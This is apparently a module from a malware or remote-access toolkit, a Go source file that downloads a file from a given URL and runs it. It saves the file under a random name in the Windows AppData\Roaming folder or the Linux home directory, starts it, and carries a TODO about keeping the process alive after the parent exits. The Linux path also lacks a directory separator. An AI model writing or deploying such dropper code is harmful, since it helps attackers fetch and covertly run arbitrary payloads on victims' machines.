package modules

import (
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)

func DownloadFile(url string, location string) error {
	// Create the file
	out, err := os.Create(location)
	if err != nil  {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil  {
		return err
	}

	return nil
}

func executeFile(location string, args []string) error {
	// TODO: Make the process last after the parent dies
	cmd := exec.Command(location, args...)
	return cmd.Start()
}

// These two variables are used by the randomString function
const charset = "abcdefghijklmnopqrstuvwxyz" +
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
var seededRand *rand.Rand = rand.New(
	rand.NewSource(time.Now().UnixNano()))

// This function will return a random string of length len
func randomString(length int) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func DownloadAndExecute(url string, args []string) error {
	var path string
	filenamePrefix := randomString(8) // Make the prefix a random 8 latter stirng

	if runtime.GOOS == "windows" {		// Use Appdata folder
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		path = home + "\\AppData\\Roaming\\" + filenamePrefix + ".exe"
	} else if runtime.GOOS == "linux" {	// use homedir
		usr, err := user.Current()
		if err != nil {
			return err
		}
		path = usr.HomeDir + filenamePrefix
	} else {
		return errors.New(fmt.Sprintf("invalid os: %s", runtime.GOOS))
	}

	err := DownloadFile(url, path)
	if err != nil {
		return err
	}

	return executeFile(path, args)
}